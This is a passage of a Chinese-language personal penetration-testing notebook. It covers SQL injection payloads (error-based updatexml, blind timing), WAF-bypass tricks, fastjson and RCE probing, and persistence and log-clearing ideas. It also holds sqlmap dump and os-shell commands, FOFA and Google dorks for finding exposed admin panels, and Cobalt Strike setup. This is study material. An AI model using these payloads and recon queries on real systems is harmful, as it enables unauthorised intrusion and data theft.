class="line">exp(709)+exp(710)	根据这个返回可以判断是mysql</span><br><span class="line">exp(210)+exp(209)	oracle</span><br><span class="line">exp() e的幂次</span><br><span class="line">盲注exp(709)不报错 exp(710)报错</span><br><span class="line">1.有回显直接出线sql语句	报错注入 updatexml(1, concat(&#x27;~&#x27;,(select+database())),1)%23</span><br><span class="line">2.无回显sleep(2) exp(210)	--&gt;dnslog(理解 true flase)</span><br><span class="line">3.搜索框当中的注入方式 --&gt; select * from admin where name like &quot;%&quot;.$name.&quot;%&quot;</span><br><span class="line">猜闭合规则才是重点</span><br><span class="line"></span><br><span class="line">up哥猜注入	查看返回包content-length</span><br><span class="line">keyword=2022%&#x27;)--+		</span><br><span class="line">2022&#x27;&#x27;|</span><br><span class="line">2022&#x27;</span><br><span class="line"></span><br><span class="line">函数替换</span><br><span class="line">and &amp;&amp;</span><br><span class="line">or	||</span><br><span class="line">ascii()   hex()</span><br><span class="line">substr()	mid()</span><br><span class="line">substr()		substr/**/()</span><br><span class="line"></span><br><span class="line">SeleCt 1;</span><br><span class="line"></span><br><span class="line">select * from dvwa.users where id=&#x27;1&#x27;||(substr(user(),1,1))like(&#x27;r%&#x27;)</span><br><span class="line"></span><br><span class="line">WAF检查参数</span><br><span class="line">js css很少检查</span><br><span class="line"></span><br><span class="line">参数污染核心</span><br><span class="line">a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1&amp;a=1		消耗waf内存 每次waf都要检查</span><br><span class="line"></span><br><span class="line">content-type:application/x-www-form-urlencoded</span><br><span class="line">改成content-type:application/form-data</span><br><span class="line">修改post提交数据</span><br><span class="line"></span><br><span class="line">waf要讲效率 构造打的类型的报文</span><br><span class="line">比如content-type改成上传图片</span><br><span class="line">然后上传个大图</span><br><span class="line"></span><br><span class="line">分析接口存在的含义 以及与数据库交互的可能性</span><br><span class="line">数据包的各个参数都不要放过</span><br><span class="line">Webservice接口(还可能造成严重的未授权)</span><br><span class="line">排序可控除 js文件的一些未授权接口 spring未授权接口</span><br><span class="line">深度测试，切勿浮躁</span><br></pre></td></tr></table></figure>

<h3 id="6-SQL注入总结"><a href="#6-SQL注入总结" class="headerlink" title="6.SQL注入总结"></a>6.SQL注入总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.sql语句中的函数优先执行			*****</span><br><span class="line">2.执行完成的结果 拼接sql语句</span><br><span class="line">3.sql语句告诉mysql 开始执行查询</span><br><span class="line"></span><br><span class="line">显注	报错 联合</span><br><span class="line">盲注	时间 布尔</span><br><span class="line"></span><br><span class="line">select * from aa where id = 1 and updatexml(&#x27;~&#x27;, concat((select database()), 1))</span><br><span class="line"></span><br><span class="line">select * FROM dvwa.users where user_id = 1 and updatexml(1,concat(&#x27;~&#x27;,(select version()),&#x27;~&#x27;),1);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br><span class="line">改变XML_document中符合XPATH_string的</span><br><span class="line"></span><br><span class="line">盲注 substr if ascii</span><br><span class="line">or sleep()	执行时间取决于数据表大小</span><br></pre></td></tr></table></figure>

<h3 id="7-js分析前后端分离站的未授权"><a href="#7-js分析前后端分离站的未授权" class="headerlink" title="7.js分析前后端分离站的未授权"></a>7.js分析前后端分离站的未授权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">js 未授权于利用 接口未授权</span><br><span class="line">对于前后端分离站点的确定</span><br><span class="line">1.分析什么样的站点时前后端分离</span><br><span class="line">查看js</span><br><span class="line">	main.js</span><br><span class="line">	app.js</span><br><span class="line">		后台接口路径api</span><br><span class="line">		全局配置</span><br><span class="line">		系统基础信息</span><br><span class="line">		前端路径</span><br><span class="line">	chunk.js</span><br><span class="line">		chunk函数分片</span><br><span class="line">		前端业务分片 某个业务逻辑的代码块</span><br><span class="line">			运营后台相关的东西</span><br><span class="line">包含了路径		演示地址https://admin-b2b2c.pickmall.cn/login</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1679035199649.png" alt="1679035199649"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传文件后找不到路径怎么办</span><br><span class="line">1.关注页面图片 文件 css路径</span><br><span class="line">2.js业务分析 upload 找到上传文件的代码 js代码位置 查看上传接口返回的路径 js如何进行操作的</span><br><span class="line">3.自行枚举</span><br><span class="line">doc data file images image img</span><br></pre></td></tr></table></figure>

<h3 id="8-如何通过js代码找接口"><a href="#8-如何通过js代码找接口" class="headerlink" title="8.如何通过js代码找接口"></a>8.如何通过js代码找接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求里面套了一个请求	第二个请求是接口，而且也没有在后端对这个请求的合法性做验证</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1679058038752.png" alt="1679058038752"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">接口的发现</span><br><span class="line">jsfinder	推荐手工去找</span><br><span class="line">模板输出的</span><br><span class="line">	关键词	admin login path reg password system manager api</span><br><span class="line">1.关键的js框架不看 angular react vue core jquery</span><br><span class="line">*.min.js(类文件) datepick日期组件 select下拉框组件 page页面组件 upload上传 ui页面组件 map地图 echarts图标组件 editor图表组件 layui bootstarp cdn vendor</span><br><span class="line"></span><br><span class="line">2.编译型网站怎么找</span><br><span class="line">http://www.bootcss.com/	去对照</span><br><span class="line"></span><br><span class="line">3.工具</span><br><span class="line">jsfinder</span><br><span class="line"></span><br><span class="line">前后端分离的站 两个域名一个前端 一个侯丹</span><br><span class="line">jsfinder 全局爬取js 正则表达式去匹配 e.g. /&#x27;/url/&#x27;/			不一定准确</span><br></pre></td></tr></table></figure>

<h3 id="9-越权汇总"><a href="#9-越权汇总" class="headerlink" title="9.越权汇总"></a>9.越权汇总</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">下图修改返回包cookie中u的值</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230318103054097.png" alt="image-20230318103054097"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">前端代码一切展示行为完全可控</span><br><span class="line">关注报文302重定向 返回包</span><br><span class="line"></span><br><span class="line">可疑参数</span><br><span class="line">isadmin roleid grouplist homepath access role_type user_type</span><br><span class="line"></span><br><span class="line">如果cookie内容多可以一个个删了看回显包变化</span><br><span class="line"></span><br><span class="line">有数字参数搞一下 用户的搞一下 role搞一下</span><br></pre></td></tr></table></figure>

<h3 id="10-fastjson"><a href="#10-fastjson" class="headerlink" title="10.fastjson"></a>10.fastjson</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vulhub /vulhub/fastjson/1.2.24-rce</span><br><span class="line">启动docker报错 尝试关闭防火墙 关闭selinux /etc/sysconfig/selinux设置disabled 不好使</span><br><span class="line">最后修改/etc/docker/daemon.json 中的registry-mirrors属性里面本来是qiniu.com很离谱</span><br><span class="line">参考https://blog.csdn.net/ayychiguoguo/article/details/121079728</span><br><span class="line">https://blog.csdn.net/chshgod1/article/details/124574733</span><br><span class="line"></span><br><span class="line">docker ps查看docker进程</span><br><span class="line">docker exec -it ID号 bash 进入该docker进程的命令行</span><br><span class="line"></span><br><span class="line">如何确定fastjson</span><br><span class="line">修改发送的json数据包 使它报错 com.alibaba.json</span><br><span class="line">后端java服务 存在json传输 构造报错 盲猜 1.2.24-27</span><br><span class="line">域名递归解析 dnslog</span><br></pre></td></tr></table></figure>

<h3 id="11-RCE"><a href="#11-RCE" class="headerlink" title="11.RCE"></a>11.RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">不同站点 不同编程语言 命令执行的效果</span><br><span class="line">php shell() system()</span><br><span class="line">jsp .exe(&#x27;&#x27;)</span><br><span class="line">java</span><br><span class="line">python os.command()</span><br><span class="line">node (越来越流行)</span><br><span class="line"></span><br><span class="line">业务场景（邮件 某个独立的服务监控 不与数据库交互的地方 ping）</span><br><span class="line"></span><br><span class="line">/admin/getSystemStatus?aa=system.os.ssyss.ls</span><br><span class="line">1.尝试能否使用代码内部的类库的包</span><br><span class="line">2.能否闭合之前的逻辑代码进行命令执行执行</span><br><span class="line">3.常见RCE版本</span><br><span class="line"></span><br><span class="line">能否进行类库注入 前提是知道spring 内置可能存在哪些类库及对应的参数</span><br><span class="line"></span><br><span class="line">能看到一些东西的返回</span><br><span class="line">dnslog.cn</span><br><span class="line">能否进行变量覆盖</span><br><span class="line"></span><br><span class="line">遇到拦截怎么办</span><br><span class="line">1.函数替换</span><br><span class="line">2.常见的命令执行函数 有些框架直接拦截(不建议直接用常用函数)</span><br><span class="line">3.file_get_contents dirsan() extract() ====&gt; ctf</span><br><span class="line">4.造成危害 ---》读文件 数据库 代码逻辑文件</span><br><span class="line">5.基于框架的内置函数 waf基于原代码函数的二次封装的函数</span><br><span class="line"></span><br><span class="line">难点</span><br><span class="line">1.难于发现 不好找</span><br><span class="line">2.发现了 利用不了</span><br><span class="line">3.挖不到</span><br><span class="line"></span><br><span class="line">浓厚代码知识</span><br></pre></td></tr></table></figure>

<h3 id="14-渗透测试流程"><a href="#14-渗透测试流程" class="headerlink" title="14.渗透测试流程"></a>14.渗透测试流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">内网常用操作</span><br><span class="line">	横向攻击  	从一台机子移动到另外一台进一步渗透</span><br><span class="line">	代理隧道	通过第三方转发或者开启对应的端口服务之间进行通信的方式</span><br><span class="line">权限维持</span><br><span class="line">	留后门</span><br><span class="line">	痕迹清除	清楚系统内部当中一些日志等其他涉及攻击者的相关信息</span><br><span class="line">cs上线</span><br><span class="line">	下载木马 病毒 恶意脚本 远程执行 摄像头权限</span><br><span class="line">免杀</span><br><span class="line">	过waf 360安全软件的操作 恶意混淆</span><br></pre></td></tr></table></figure>

<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h3 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#端口转发</span><br><span class="line"><span class="function">https://<span class="title">blog.csdn.net</span>/<span class="title">qq_42096378</span>/<span class="title">article</span>/<span class="title">details</span>/124039392</span></span><br><span class="line"><span class="function">#<span class="title">xray</span>监听7890端口（--<span class="title">listen</span> <span class="title">local</span>:端口 代替-<span class="title">u</span> <span class="title">url</span>） <span class="title">bp</span>监听8080端口然后用<span class="title">upstream</span> <span class="title">proxy</span> <span class="title">server</span>转发到7890端口</span></span><br><span class="line"><span class="function"><span class="title">windows</span></span></span><br><span class="line"><span class="function"><span class="title">xray_windows_386.exe</span> <span class="title">ws</span> --<span class="title">url</span> <span class="title">http</span>://<span class="title">testphp.vulnweb.com</span> --<span class="title">html</span>-<span class="title">output</span> 1.<span class="title">html</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">https://blog.csdn.net/qq_43514711/article/details/127119538</span><br><span class="line">用户名hyy19	密码123</span><br><span class="line">需要管理员权限	net start &quot;Tenable Nessus&quot;</span><br><span class="line">https://127.0.0.1:8834/#/</span><br></pre></td></tr></table></figure>

<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">burpsuite 目录下	双击不晓得为啥不好使了</span><br><span class="line">cmd	java -jar BurpLoaderKeygen.jar</span><br><span class="line"></span><br><span class="line">#	https://blog.csdn.net/qq1140037586/article/details/128455338</span><br><span class="line">插件		NEW_xp_CAPTCHA</span><br><span class="line">python环境地址	D:\BaiduNetdiskDownload\NEW_xp_CAPTCHA win64 python环境完整版\NEW_xp_CAPTCHA\Python36</span><br><span class="line">发送到intruder</span><br><span class="line">线程1</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/m0_64378913/article/details/124439539</span><br><span class="line">-u  <span class="string">&quot;url&quot;</span>		<span class="comment">#检测注入点</span></span><br><span class="line">--dbs			<span class="comment">#列出所有数据库的名称</span></span><br><span class="line">--current-db	<span class="comment">#列出当前数据库的名称</span></span><br><span class="line">-D				<span class="comment">#指定一个数据库</span></span><br><span class="line">--tables		<span class="comment">#列出所有表名</span></span><br><span class="line">-T				<span class="comment">#指定表名</span></span><br><span class="line">--columns		<span class="comment">#列出所有字段名</span></span><br><span class="line">-C				<span class="comment">#指定字段</span></span><br><span class="line">--dump			<span class="comment">#列出字段内容</span></span><br><span class="line"><span class="comment">#	post注入</span></span><br><span class="line">-r xxx.txt <span class="comment">#xxx.txt为http数据包</span></span><br><span class="line"></span><br><span class="line">–cookie <span class="comment">#指定cookie</span></span><br><span class="line">–os-shell <span class="comment">#获取shell</span></span><br><span class="line"></span><br><span class="line">1）判断可注入的参数；</span><br><span class="line">2）判断可以用哪种SQL注入技术来注入；</span><br><span class="line">3）识别出哪种数据库；</span><br><span class="line">4）根据用户选择，读取哪些数据。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	get请求注入</span></span><br><span class="line"><span class="comment">#	sqllab</span></span><br><span class="line">sqlmap.py -u http://192.168.56.1/sqllab/sqllab/Less-1/?<span class="built_in">id</span>=1</span><br><span class="line">sqlmap.py -u http://192.168.56.1/sqllab/sqllab/Less-1/?<span class="built_in">id</span>=1 --dbs</span><br><span class="line">sqlmap.py -u http://192.168.56.1/sqllab/sqllab/Less-1/?<span class="built_in">id</span>=1 --current-db</span><br><span class="line">...</span><br><span class="line">sqlmap.py -u http://192.168.56.1/sqllab/sqllab/Less-1/?<span class="built_in">id</span>=1 -D security -T <span class="built_in">users</span> -C <span class="string">&quot;password,username&quot;</span> --dump</span><br><span class="line"></span><br><span class="line">sqlmap利用谷歌批量扫描注入点</span><br><span class="line">	https://blog.csdn.net/tomyyyyyy/article/details/115688999</span><br><span class="line">绕防火墙的思路</span><br><span class="line">	/tamper目录可修改发送数据包 见zz_rdog.py</span><br></pre></td></tr></table></figure>

<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/m0_46363249/article/details/119983709</span><br><span class="line">逻辑运算符</span><br><span class="line">app=&quot;Coremail&quot; &amp;&amp;  country=CN          #查找使用coremail并且在中国境内的网站</span><br><span class="line">title=&quot;管理后台&quot; ||  title=&quot;登录后台&quot;   #查找title中含有管理后台或者登录后台的网站</span><br><span class="line">port!=&quot;80&quot;                             #匹配端口不为80端口的服务</span><br><span class="line">搜索域名中包含qq.com</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1677399625944.png" alt="1677399625944"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">搜索qq.com的子域名		   domain=&quot;qq.com&quot;</span><br><span class="line">统计全球的Apache				server=&quot;Apache&quot;	返回包包含Server:Apach</span><br><span class="line">网页body内包含后台				body=“后台” &amp;&amp; domain=&quot;youku.com&quot;</span><br><span class="line">搜索证书 					cert=&quot;baidu&quot;	百度公司检查自己域名时候有心脏出血漏洞</span><br><span class="line">搜索指定应用网站</span><br><span class="line">	app=&quot;Coremail&quot;                              #查找使用Coremail的网站</span><br><span class="line">    app=&quot;Oracle-Weblogic_interface_7001&quot;        #查找使用Weblogic的网站</span><br><span class="line">    app=&quot;CCTV-Cameras&quot;                          #查找使用九安视频监控的网站</span><br><span class="line">    app=&quot;奇安信-天擎&quot;                            #查找使用天擎的网站</span><br><span class="line">    app=&quot;Apache-Shiro&quot;                          #查找使用shiro的网站</span><br><span class="line">    app=&quot;struts2&quot;                               #查找使用struts2的网站</span><br><span class="line">    app=&quot;TongDa-OA&quot;                             #查找使用通达OA的网站</span><br><span class="line">    app=&quot;致远互联-OA&quot;                            #查找使用致远OA的网站</span><br><span class="line">    app=&quot;泛微-协同办公OA&quot;                        #查找使用泛微OA的网站</span><br><span class="line">    app=&quot;万户网络-ezOFFICE&quot;                      #查找使用万户OA的网站</span><br><span class="line">    app=&quot;ATLASSIAN-Confluence&quot;                  #查找使用confluence的网站</span><br><span class="line">    app=&quot;f5-BIGIP&quot;                              #查找使用f5的网站</span><br><span class="line">    title=&quot;+ ID_VC_Welcome +&quot;                   #查找Vcenter的网站</span><br><span class="line">指定端口</span><br><span class="line">	port=&quot;3389&quot;   #查找开放3389端口的主机</span><br><span class="line">    ports=&quot;1433,3306,3389&quot;      #查找开放了1433,3306,3389端口的主机</span><br><span class="line">    ports==&quot;1433,3306,3389&quot;		#查找只开放了1433,3306,3389端口的主机</span><br><span class="line">指定协议的ip</span><br><span class="line">	protocol=mysql       #查找使用mysql的ip</span><br><span class="line">    protocol=mssql       #查找使用mssql的ip</span><br><span class="line">    protocol=oracle      #查找使用oracle的ip</span><br><span class="line">    protocol=redis       #查找使用redis的ip</span><br><span class="line">ip或网段信息</span><br><span class="line">	ip=&quot;220.181.38.148&quot;   #查找指定ip的信息</span><br><span class="line">	ip=&quot;220.181.38.0/24&quot;  #查找指定网段的信息</span><br><span class="line">框架特有的css/js文件</span><br><span class="line">	&quot;style/lrtk.css&quot;</span><br><span class="line">常用的内容</span><br><span class="line">	title=&quot;管理后台&quot;     #查找title含有管理后台的ip</span><br><span class="line">    header=&quot;thinkphp&quot;   #查找响应头含有thinkphp的ip</span><br><span class="line">    body=&quot;管理后台&quot;      #</span><br><span class="line">    domain=&quot;baidu.com&quot;  #查找指定根域的所有子域</span><br><span class="line">    host=&quot;baidu&quot;        #查找host字段中带有baidu的网站      </span><br><span class="line">    country=&quot;CN&quot;        #查找中国境内的ip</span><br><span class="line">    region=&quot;Jiangsu&quot;    #查找江苏地区的ip</span><br><span class="line">    cert=&quot;phpinfo.me&quot;   #搜索证书(如https证书、imaps证书等)中含有&quot;phpinfo.me&quot;关键词的网站和IP</span><br><span class="line">    server=&quot;apache&quot;     #服务器使用apache的网站</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下不一定好使</span></span><br><span class="line"><span class="comment">#icon_hash=&quot;-1507567067&quot; 可以使用以下代码读取ico，并生成搜索语法（Python2）</span></span><br><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;/favicon.ico&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;logo&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    url = url + <span class="string">&quot;/favicon.ico&quot;</span></span><br><span class="line"><span class="built_in">print</span> url</span><br><span class="line">response = requests.get(url, verify=<span class="literal">False</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nicon_hash=\&quot;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hash</span>)+<span class="string">&quot;\&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/beyondp/article/details/126055437</span><br><span class="line">1.site:限制搜索范围在某网站或顶级域名中</span><br><span class="line">2.inurl:搜索网页包含的url地址</span><br><span class="line">3.intext:只搜索网页部分包含的文字</span><br><span class="line">4.intitle:限制搜索的网页标题</span><br><span class="line">5.filetype:搜索文件的后缀名或拓展名(文件类型)</span><br><span class="line"></span><br><span class="line">1.查找后台管理地址</span><br><span class="line">site:xxx.com(目标网址的域名) intext:管理/后台…</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:login/admin…</span><br><span class="line">site:xxx.com(目标网址的域名) intitle:管理/后台…</span><br><span class="line">2.查找上传类漏洞地址</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:file</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:upload</span><br><span class="line">3.查找注入漏洞地址</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:php? id=</span><br><span class="line">4.查找登录界面</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:“/admin/login.php”</span><br><span class="line">5.查找指定站点xls文件</span><br><span class="line">site:xxx.com(目标网址的域名) filetype:xls</span><br><span class="line">6.查找编辑器页面</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:ewebeditor</span><br></pre></td></tr></table></figure>

<h3 id="ARL"><a href="#ARL" class="headerlink" title="ARL"></a>ARL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">装在了kali		/home/hyy19/ARL/docker</span><br><span class="line">config-docker.yaml中有配置fofa</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose down</span><br><span class="line">https:192.168.213.130:5003</span><br></pre></td></tr></table></figure>

<h3 id="Antsword"><a href="#Antsword" class="headerlink" title="Antsword"></a>Antsword</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果更新</span><br><span class="line">d盘app_install antsword文件夹里面删了</span><br><span class="line">d盘app_install antsword-loader-v4.0.3-win32-x64 exe文件打开初始化即可</span><br></pre></td></tr></table></figure>

<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">管理员运行 .\teamserver.bat 192.168.56.1 密码1</span><br><span class="line">start.bat 用户名任意 密码1</span><br></pre></td></tr></table></figure>



